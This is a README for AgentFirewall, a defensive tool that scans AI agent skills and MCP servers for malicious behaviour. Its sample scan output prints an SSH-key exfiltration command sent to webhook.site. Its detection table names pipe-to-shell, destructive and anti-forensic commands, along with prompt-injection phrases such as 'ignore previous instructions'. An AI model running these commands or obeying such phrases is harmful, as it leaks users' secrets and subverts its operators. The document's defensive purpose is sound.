# 🛡️ AgentFirewall

**A security firewall for AI agents, skills, and MCP servers. Scan before you install.**

[![CI](https://github.com/mmedabo/agentfirewall/actions/workflows/ci.yml/badge.svg)](https://github.com/mmedabo/agentfirewall/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/)

The AI ecosystem is exploding with shareable **agents**, **skills**, **plugins**,
and **MCP servers** — and, just like npm packages or browser extensions, most of
them come from people you don't know. A single markdown file or `setup.sh` can
quietly read your `~/.ssh` keys, dump your environment variables to a webhook,
pipe a remote script into your shell, or hide instructions that tell your agent
to leak secrets *without telling you*.

AgentFirewall inspects these artifacts **before** they ever touch your machine.
It works like a real firewall: it **pre-checks** what you're about to install,
**exposes** anything suspicious, and **blocks** the installation when the risk is
too high — with a clear, auditable report of exactly why.

> No cloud. No API keys. No telemetry. It runs 100% locally with **zero
> dependencies**, so you can trust the thing that checks your trust.

---

## What it catches

| Category | Examples |
|---|---|
| 🔑 **Secret & credential theft** | reading `~/.ssh`, `~/.aws/credentials`, `.env`, dumping the environment, targeting `ANTHROPIC_API_KEY` / `GITHUB_TOKEN` |
| 🎫 **Embedded credentials** | private keys, AWS `AKIA…`, GitHub `ghp_…`, OpenAI/Anthropic `sk-…`, Slack tokens shipped *inside* the artifact |
| 📡 **Data exfiltration** | uploads to pastebin/`webhook.site`/Discord webhooks, raw-IP egress, reverse shells, DNS-tunnel exfiltration |
| 🧬 **Obfuscation & dynamic exec** | `curl … \| bash`, `base64 -d \| sh`, `eval`/`exec` on runtime strings, hex-encoded payloads |
| 🥫 **Unsafe deserialization** | `pickle.load`, `torch.load`, unsafe `yaml.load`, bundled `.pkl`/`.pt` weight files (model poisoning) |
| 💣 **Destructive actions** | `rm -rf ~/`, `mkfs`, fork bombs, `chmod 777`, disabling firewalls/TLS, crypto-miners, cron/autostart persistence |
| 🕵️ **Anti-forensics** | clearing shell history, deleting `/var/log`, `unset HISTFILE` |
| 🧠 **Prompt injection** | "ignore previous instructions", "do not tell the user", "you are now in developer mode", instructions to exfiltrate secrets |
| 🪝 **Tool poisoning** | hidden directives inside MCP/tool **descriptions**, MCP `env` secrets, auto-approve flags |
| 🧬 **Memory / context poisoning** | writes to `CLAUDE.md`, `.cursorrules`, MCP config and other files other agents auto-load |
| 👻 **Hidden content** | zero-width characters, bidirectional-override tricks, invisible Unicode-Tag instructions, high-entropy packed blobs |
| 🎛️ **Permission overreach** | skills/agents granting themselves `tools: "*"`, unrestricted `Bash(*)`, silent install hooks |
| 🎭 **Typosquatting** | homoglyph/look-alike names, one-edit near-misses of popular packages |
| 🔁 **Rug pulls** *(stateful)* | a pinned artifact whose files, tools, permissions or tool descriptions **silently change** in a later update |
| 📜 **Weak provenance** | unsigned / unattested artifacts get a lower **trust tier** that tightens the policy applied to them |
| 🚫 **Known-bad IoCs** | artifact name, file hash, contacted domain or signer identity on a threat-intel feed |
| 🎢 **Excessive agency** *(deployed agents)* | a chatbot that runs arbitrary code / has no topic scope (the "McDonald's bot writes Python" case) |
| 🎟️ **Broken authorization** *(deployed agents)* | the expensive agent action runs *before* the quota/authz check (TOCTOU), or the limit is only enforced client-side (the Bolt.new refresh exploit) |

Every detection is mapped to an industry framework — **OWASP Top 10 for LLM Apps**,
**OWASP Top 10 for Agentic Apps**, **MITRE ATLAS**, **MCP threat research** and
**SLSA/supply-chain**. Run `afw rules` to see each detection with its ID, severity,
and framework coverage. See [`docs/THREAT-MODEL.md`](docs/THREAT-MODEL.md) for the
full mapping and [`docs/ROADMAP.md`](docs/ROADMAP.md) for where this is going.

---

## Install

```bash
pip install agentfirewall           # from PyPI (once published)
# or, from source:
git clone https://github.com/mmedabo/agentfirewall
cd agentfirewall && pip install -e .
```

This installs the `afw` command (aliased as `agentfirewall`). You can also run it
without installing: `python -m agentfirewall …`.

---

## Quick start

**Scan an agent skill you downloaded:**

```bash
afw scan ./some-skill-you-found-online
```

```
AgentFirewall scan
  artifact : super-helper  (skill)
  files    : 2 scanned
  tools    : *
  findings : CRITICAL:4  HIGH:14  MEDIUM:1

 CRITICAL  Reads SSH private keys  [AFW-SEC-001]
          Accesses SSH private key material, a classic credential-theft target.
          → setup.sh:7
          cat ~/.ssh/id_rsa | curl -X POST --data @- https://webhook.site/collect
 ...
  ✗ VERDICT: BLOCK
  Installation should be blocked: high-risk behaviour detected.
```

**Gate an install — the firewall only lets it through if it's clean:**

```bash
afw install ./some-skill --to ~/.claude/skills
# ⛔ Installation BLOCKED by AgentFirewall — ./some-skill was NOT copied.
```

A safe skill installs normally; a dangerous one is refused (use `--force` to
override at your own risk).

**Monitor a directory and scan things as they land in it:**

```bash
afw watch ~/Downloads/agents
```

**Use it as a CI gate** (exits non-zero when something is blocked):

```bash
afw verify ./my-published-skill --format sarif > results.sarif
```

**Pin a trusted version, then catch rug pulls on every update:**

```bash
afw pin ./some-skill                       # writes ./some-skill/afw.lock
# ... later, after the author ships an update ...
afw verify ./some-skill --baseline ./some-skill/afw.lock
# ✗ CRITICAL  Tool grant added since baseline   [AFW-DRIFT-010]
#   HIGH      Baselined file changed            [AFW-DRIFT-001]
```

A previously-clean tool whose **permissions or description silently changed** is,
by itself, the alarm — even if the new code contains no known-bad signature. This
is how AgentFirewall catches the attacks static scanning can't: rug pulls and
insider updates (like the Postmark BCC incident) that ship clean and mutate later.

**Trust tiers & threat intel — treat unknown sources with more suspicion:**

Like a firewall's trust zones, AgentFirewall assigns each artifact a **trust tier**
from the provenance it can find, and holds low-trust artifacts to a stricter bar:

```
UNTRUSTED  no signature / attestation / baseline   → block threshold tightens
DECLARED   signature or SBOM present (unverified)
PINNED     you hold a local afw.lock for it         → afw pin
VERIFIED   signature cryptographically verified      → --verify-signatures --identity <id>
```

```bash
afw scan ./skill                       # trust: Untrusted  (unsigned → stricter policy)
afw scan ./skill --intel ./my-iocs/    # also match names/hashes/domains/signers vs your feeds
```

Threat-intel feeds are **offline by default** (JSON or `names.txt`/`domains.txt`/
`hashes.txt`/`signers.txt`); drop your own into `~/.config/agentfirewall/intel/`.
A hit on a known-malicious name, file hash, domain or revoked signer is `AFW-IOC-*`.

**Runtime firewall — watch it *while it runs*, not just before:**

Static scanning can't stop a payload it didn't recognise. The runtime layer does —
by controlling what the agent can actually reach and say at run time.

```bash
# Egress firewall: default-deny outbound; only github.com gets through.
afw run --allow "*.github.com" -- npx some-agent
#   BLOCK HTTP    evil.example:80
#   ALLOW HTTP    api.github.com:443

# MCP tool-call proxy: inspect/redact/block an MCP server's traffic in real time.
afw mcp-proxy -- npx some-mcp-server
#   [afw mcp BLOCK  ] client→server  AFW-SEC-001  Reads SSH private keys
#   [afw mcp REDACT ] server→client  AFW-TPZ-001  Tool description contains hidden directive
```

`afw run` routes the command's outbound HTTP(S) through a default-deny filtering
proxy — anything off the allowlist gets a `403` and is logged (`--fail-on-egress`
for CI). `afw mcp-proxy` mediates the JSON-RPC channel between an agent and an MCP
server, catching **tool poisoning** in `tools/list`, **secret egress** in
`tools/call` arguments, and **injected instructions** in tool results — forwarding,
redacting, or blocking per `--action`.

**Bypass-proof isolation — run untrusted install hooks with *zero* network:**

```bash
afw run --isolate -- bash setup.sh
#   method  : unshare (root netns)
#   network : DENIED (kernel-enforced; no external connectivity)
```

`--isolate` runs the command in a **kernel network namespace** with no external
interface, so it physically cannot reach anything — even via raw sockets. Add
`--allow` for a **bypass-proof allowlist** — reach these hosts and nothing else,
kernel-enforced:

```bash
afw run --isolate --allow "*.github.com" -- npx some-agent
#   ALLOW HTTP    api.github.com:443     ← brokered out
#   (a raw socket to anywhere else simply gets no network)
```

Three strengths, your pick: `--allow` (proxy allowlist, governs proxy-respecting
clients) · `--isolate` (hard zero-network) · `--isolate --allow` (bypass-proof
allowlist — a namespace with no route, egress brokered through a Unix-socket
filtering proxy). All pure `unshare` + stdlib, no external dependencies; uses
`bubblewrap` for extra fs/seccomp confinement when installed.

**Prefer a browser?** `afw serve` opens a local web UI — drag-drop a skill folder
or `.zip` and read the verdict, trust tier and findings, no terminal required.

```bash
afw serve --open        # http://127.0.0.1:8000 (runs locally, nothing is uploaded)
```

Try it right now against the bundled examples:

```bash
afw scan examples/safe-skill        # ✓ ALLOW  (trust: Untrusted)
afw scan examples/signed-skill      # ✓ ALLOW  (trust: Declared — signature + SBOM)
afw scan examples/malicious-skill   # ✗ BLOCK  (a catalogue of bad behaviour + IoC hit)
afw scan examples/poisoned-mcp      # ✗ BLOCK  (MCP tool poisoning + env secrets)
```

---

## Commands

| Command | What it does |
|---|---|
| `afw scan <path>...` | Inspect artifacts and print a report. Exit code reflects the worst verdict. |
| `afw verify <path>...` | CI gate. Exit `2` if any artifact is **BLOCK** (`--fail-on-warn` to also fail on warnings). |
| `afw install <path> --to <dir>` | Pre-check, then copy into place **only if it passes** the firewall. |
| `afw pin <path>` | Record a trusted baseline (`afw.lock`) for later rug-pull detection. |
| `afw run --allow <host> -- <cmd>` | Run a command behind a **default-deny egress firewall** (block exfiltration). |
| `afw mcp-proxy -- <server>` | Sit in front of an MCP server and **inspect/redact/block tool calls & results** live. |
| `afw serve` | Launch the **local web UI** — drag-drop a folder/zip and read the report in a browser. |
| `afw watch <dir>` | Poll a directory and scan new/modified artifacts as they appear. |
| `afw rules` | List every detection with ID, severity, category, and framework coverage. |

Common flags: `--format text|json|sarif`, `--policy <file>`, `--strict`,
`--fail-on <SEVERITY>`, `--ignore <RULE_ID>`, `--baseline <lock>`, `--intel <path>`,
`--no-intel`, `--verify-signatures --identity <id>`, `--no-tighten-untrusted`,
`--no-color`, `-v/--verbose`.

Artifacts can be a **directory**, a **single file**, or a **`.zip` archive**.

---

## Verdicts & severity

Each finding has a severity — `INFO`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL` — and the
**policy** turns findings into one of three verdicts:

- **ALLOW** ✓ — nothing worrying found.
- **WARN** ! — review before installing.
- **BLOCK** ✗ — high-risk behaviour; installation should be refused.

Exit codes: `0` allow/warn, `2` block, `1` on error — friendly for shell and CI.

### Policy

The default policy blocks on `HIGH` and above. Tune it with `--strict` (blocks on
`MEDIUM`+) or a policy file:

```yaml
# policy.yaml
block_severity: HIGH
warn_severity: LOW
ignore:
  - AFW-PERM-002        # accept an expected "powerful tool" finding
warn_only_categories:
  - install-hook
```

```bash
afw scan ./skill --policy policy.yaml
```

Policy files are JSON or YAML (YAML works without any dependency for the simple
schema above; `pip install agentfirewall[yaml]` for full YAML).

---

## Use it from Python

```python
from agentfirewall import Scanner, Policy, Verdict

result = Scanner(policy=Policy.strict()).scan_path("./some-skill")

print(result.verdict)                       # Verdict.BLOCK
for f in result.findings:
    print(f.severity.label, f.rule_id, f.location(), f.message)

if result.verdict is Verdict.BLOCK:
    raise SystemExit("refusing to install")
```

---

## How it works

```
 target ──▶ loaders ──▶ Artifact ──▶ rule engine ──▶ findings ──▶ policy ──▶ verdict
 (dir/file/zip)        (files +      (signature +               (severity     (allow/
                        manifest      structural rules)          threshold)    warn/block)
                        metadata)
```

1. **Loaders** turn the target into an `Artifact`, recognising skills (`SKILL.md`),
   agents, MCP configs, and plugins, and extracting their declared tools/permissions.
2. **Rules** inspect every text file. Most detections are regex **signatures**
   (easy to audit and extend); **structural** rules handle prompt injection,
   invisible Unicode, entropy analysis, and permission overreach.
3. **Policy** maps findings to a verdict you can gate installation on.

Modelled on a real firewall's layered stack, AgentFirewall works in three tiers:

```
PRE-INSTALL (static)     scan code, manifests and model-facing text   → afw scan
INSTALL-TIME (stateful)  pin a baseline; re-verify every update        → afw pin / --baseline
TRUST ZONE (provenance)  signatures / SBOM / trust tiers / IoC feeds   → afw scan --intel
RUNTIME (dynamic)        egress firewall + tool-call proxy             → afw run / afw mcp-proxy
```

All four tiers ship today. The first three are **static analysis + stateful
diffing** — they read artifacts, never execute them, so they're safe to point at
untrusted content. The runtime tier watches execution: it never needs to trust the
code because it controls what the running process can reach and say. Like any
firewall it's defence in depth, not a single guarantee — review `HIGH`/`CRITICAL`
findings yourself. See [`docs/THREAT-MODEL.md`](docs/THREAT-MODEL.md) for the full
firewall-mechanics mapping.

---

## Extending it

Adding a detection is usually one line. Drop a signature into
`agentfirewall/rules/signatures.py`:

```python
compile_sig(
    "AFW-NET-007", "Contacts my-bad-host", Severity.HIGH,
    r"my-bad-host\.example",
    "Reaches a known-bad host.",
    "Remove this network call.",
)
```

For non-regex logic, subclass `Rule` in `agentfirewall/rules/structural.py` and add
it to the registry in `agentfirewall/rules/__init__.py`. See
[CONTRIBUTING.md](CONTRIBUTING.md).

---

## Harden the agents you *deploy*, not just the ones you install

Everything above protects your machine from a malicious artifact you install. The
other direction matters too: an agent **you ship** can be abused by its own users.
AgentFirewall scans your agent app for the two classes that keep showing up in the
wild:

- **Excessive agency / no scoping** — a food-ordering bot that will happily run
  arbitrary Python, or a system prompt that says "you can do anything." Flagged as
  `AFW-AGENCY-*` (OWASP LLM06 Excessive Agency).
- **Broken authorization** — the expensive agent call runs *before* the quota/authz
  check (a TOCTOU that a page refresh replays — the real Bolt.new free-token
  exploit), or the limit is only enforced in the browser. Flagged as `AFW-AUTHZ-*`
  (CWE-367 TOCTOU, OWASP API Broken Function-Level Authorization, LLM10).

```bash
afw scan ./my-agent-app        # ✗ BLOCK: AFW-AUTHZ-001 model invoked before the credit check
```

Try it on the bundled example: `afw scan examples/vulnerable-agent-app`.

**Then *enforce* the fix at run time** with the embeddable `agentfirewall.guardrails`
library — this is what actually stops both exploits, not just detects them:

```python
from agentfirewall.guardrails import InputGuard, ScopePolicy, PreconditionGate, InMemoryQuota

guard = InputGuard(ScopePolicy.for_tools("search_menu", "place_order"))  # deny code exec / off-scope tools
gate  = PreconditionGate(InMemoryQuota(balances={"user-1": 5}))          # check-before-act + idempotency

def handle_chat(user_id, prompt, request_id):
    guard.check_input(prompt).raise_if_blocked()                 # scope confinement
    return gate.run(user_id, lambda: agent.run(prompt),          # quota reserved BEFORE the agent runs;
                    idempotency_key=request_id)                  # a refresh with the same id can't replay
```

`PreconditionGate` reserves quota atomically *before* the agent runs and returns the
cached result on a replay (so the refresh exploit can't burn free tokens);
`InputGuard` denies `run_python`/off-allowlist tool calls and prompt-injection. See
`examples/guarded-agent-app` for the vulnerable example rewritten safely.

## Use it in CI (GitHub Action)

Gate your own repo's skills/agents on every push with the reusable action:

```yaml
# .github/workflows/agentfirewall.yml
name: AgentFirewall
on: [push, pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: mmedabo/agentfirewall@v0.6.0
        with:
          path: ./skills
          args: --strict          # optional: block on MEDIUM+ ; or --format sarif
```

The step fails the build if any artifact is **BLOCK** (`command: scan` reports
without failing). See [`action.yml`](action.yml) for all inputs.

## Documentation

| Doc | What's in it |
|---|---|
| [`docs/USAGE.md`](docs/USAGE.md) | Task-oriented cookbook for every command, incl. the web UI |
| [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) | Module map, data flow, and how to extend each layer |
| [`docs/THREAT-MODEL.md`](docs/THREAT-MODEL.md) | Threat model, firewall-mechanics mapping, rule→framework table |
| [`docs/ROADMAP.md`](docs/ROADMAP.md) | Phases 0–5: what's shipped and what's planned |
| [`CONTRIBUTING.md`](CONTRIBUTING.md) · [`SECURITY.md`](SECURITY.md) | Adding detections; reporting bypasses |

## Development

```bash
pip install -e ".[dev]"
pytest
```

## License

[MIT](LICENSE) — free to download, install, use, and build on.

---

*AgentFirewall is a defensive security tool. It helps you make informed trust
decisions about third-party AI agents; it does not replace reading the code
yourself for anything sensitive.*
